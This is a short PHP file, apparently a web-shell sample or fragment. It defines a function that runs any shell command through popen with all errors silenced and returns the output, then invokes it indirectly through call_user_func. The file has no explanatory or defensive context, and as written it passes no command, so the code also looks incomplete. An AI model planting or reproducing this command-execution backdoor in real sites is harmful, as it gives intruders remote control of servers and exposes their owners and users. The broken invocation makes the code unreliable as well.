<?php
function do_phpfun($cmd,$fun) {
	$res = '';
	$f = @popen($cmd,"r");
	while(!@feof($f))	
		$res .= @fread($f,1024);
	@pclose($f);
	return $res;
}

call_user_func('do_phpfun');
?>